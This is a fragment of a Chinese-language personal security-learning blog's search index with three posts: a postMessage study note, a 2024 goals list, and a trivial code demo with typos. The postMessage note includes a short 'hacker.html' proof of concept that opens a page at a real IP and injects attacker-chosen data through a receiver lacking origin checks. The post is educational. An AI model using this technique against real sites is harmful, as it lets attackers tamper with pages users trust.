      <link href="/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">Postmessage学习 </h1><h1 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><blockquote><p><code>postMessage</code> 是一个用于在不同窗口或文档之间进行安全跨域通信的 Web API 方法。它允许一个窗口或 iframe 向另一个窗口或 iframe 发送消息，即使这些窗口或 iframe 不在同一个域中也可以安全使用。这是为了避免跨域限制而设计的一种机制。</p></blockquote><ul><li>基本语法如下：<br><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">otherWindow: 目标窗口的引用，可以是另一个窗口、iframe 或者其他支持 postMessage 的对象。</span><br><span class="line">message: 要发送的消息数据，可以是字符串、数字、对象等。</span><br><span class="line">targetOrigin: 表示目标窗口的源（origin），这是一个字符串。如果你知道目标窗口的源，可以提供它，以增加安全性。可以是具体的源（例如，&quot;https://example.com&quot;），或者通配符 &quot;*&quot; 表示允许来自任意源的消息。</span><br><span class="line">transfer (可选): 一个可选的数组，包含要在消息中传递的 Transferable 对象，如 ArrayBuffer。</span><br><span class="line"></span><br><span class="line">在发送端，你可以使用 postMessage 将消息发送到目标窗口：</span><br><span class="line">const targetWindow = document.getElementById(&quot;target&quot;).contentWindow;</span><br><span class="line">targetWindow.postMessage(&quot;Hello, this is a message!&quot;, &quot;https://example.com&quot;);</span><br><span class="line"></span><br><span class="line">在接收端，你可以通过在 window 上监听 &quot;message&quot; 事件来捕获发送的消息：</span><br><span class="line">window.addEventListener(&quot;message&quot;, (event) =&gt; &#123;</span><br><span class="line">  // 处理接收到的消息</span><br><span class="line">  const receivedMessage = event.data;</span><br><span class="line">  console.log(receivedMessage);</span><br><span class="line">&#125;, false);</span><br><span class="line">这种机制通常用于在同一域之间的不同窗口或 iframe 之间进行通信，例如在父窗口和嵌套的 iframe 之间。</span><br></pre></td></tr></table></figure></li></ul><h2 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h2><ul><li>demo1.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function openChild() &#123;</span><br><span class="line">    child = window.open(&#x27;demo2.html&#x27;, &#x27;popup&#x27;, &#x27;height=300px, width=500px&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    //发送的数据内容</span><br><span class="line">    let msg=&#123;pName : &quot;jack&quot;, pAge: &quot;12&quot;&#125;;</span><br><span class="line">    //发送消息数据数据到任意目标源, *指的是任意anyone</span><br><span class="line">    child.postMessage(msg,&#x27;*&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnopen&#x27; value=&#x27;Open child&#x27; onclick=&#x27;openChild();&#x27; /&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnSendMsg&#x27; value=&#x27;Send Message&#x27; onclick=&#x27;sendMessage();&#x27; /&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>demo2.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        //添加事件监控消息</span><br><span class="line">    window.addEventListener(&quot;message&quot;, (event)=&gt;&#123;</span><br><span class="line">        let txt=document.getElementById(&quot;msg&quot;);</span><br><span class="line">        //接收传输过来的变量数据</span><br><span class="line">        txt.value=`Name is $&#123;event.data.pName&#125; Age is  $&#123;event.data.pAge&#125;` ;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;h1&gt;postMessage学习&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&#x27;text&#x27; id=&#x27;msg&#x27;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>效果</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301354143.png" style="zoom:50%;" /><h1 id="危害演示"><a href="#危害演示" class="headerlink" title="危害演示"></a>危害演示</h1><ul><li>我们从本地创建直接访问hacker.html代码就可以串改deom2网页的内容</li><li>这里要使用setimeout函数，因为这样我猜是window.open 方法通常是异步的，它会在后台加载新文档，而不会等待文档完全加载。因此，使用 setTimeout 会等待一段时间，以确保新文档已经准备好接收消息。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">childwin = window.open(&#x27;http://119.45.227.86/postmessage/demo2.html&#x27;);</span><br><span class="line"></span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    let msg=&#123;pName : &quot;attacker&quot;, pAge: &quot;16&quot;&#125;;</span><br><span class="line">    childwin.postMessage(msg,&#x27;*&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(function()&#123;setTimeout(&quot;sendMessage()&quot;,1000);&#125;()); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301410735.png" alt="image-20240130141053689"></p><ul><li>对于存在跳转漏洞即是herf跳转的，具体可以查看DOM-XSS靶场中的漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年计划</title>
      <link href="/2024/01/05/%E6%9D%82%E8%B0%88/2024%E5%B9%B4%E7%9B%AE%E6%A0%87/"/>
      <url>/2024/01/05/%E6%9D%82%E8%B0%88/2024%E5%B9%B4%E7%9B%AE%E6%A0%87/</url>
      
        <content type="html"><![CDATA[<h1 align="center">2024年计划</h1><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><blockquote><p>今天看了一天视频学了Hexo搭建博客，现在稍微懂一些吧。其实git还不是很懂，也是第一次发博客，花了一天的时间，希望这个博客也是让我坚持学习的动力吧（毕竟我是一个不怎么坚定的人）<br>第一个博客也是制定一下2024年的计划吧</p></blockquote><h1 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h1><h2 id="1-首先把企业src漏洞挖明，真的要好好专研门道！"><a href="#1-首先把企业src漏洞挖明，真的要好好专研门道！" class="headerlink" title="1.首先把企业src漏洞挖明，真的要好好专研门道！"></a>1.首先把<code>企业src漏洞挖明</code>，真的要好好专研门道！</h2><h2 id="2-尝试接触红队，起码看完红队笔记，试着打打HTB"><a href="#2-尝试接触红队，起码看完红队笔记，试着打打HTB" class="headerlink" title="2.尝试接触红队，起码看完红队笔记，试着打打HTB"></a>2.尝试接触红队，起码看完红队笔记，试着打打HTB</h2><h2 id="3-CTF看看能不能试着拿个奖"><a href="#3-CTF看看能不能试着拿个奖" class="headerlink" title="3.CTF看看能不能试着拿个奖"></a>3.CTF看看能不能试着拿个奖</h2><h2 id="4-保持情绪稳定，知行合一，尽量每天都学新知识写笔记"><a href="#4-保持情绪稳定，知行合一，尽量每天都学新知识写笔记" class="headerlink" title="4.保持情绪稳定，知行合一，尽量每天都学新知识写笔记"></a>4.保持<code>情绪稳定</code>，<code>知行合一</code>，尽量每天都学新知识写笔记</h2><h2 id="5-减肥！减肥！减肥！"><a href="#5-减肥！减肥！减肥！" class="headerlink" title="5.减肥！减肥！减肥！"></a>5.减肥！减肥！减肥！</h2>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
            <tag> 目标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/"/>
      <url>/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">    funtion a()&#123;        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        vconsole.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)    &#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
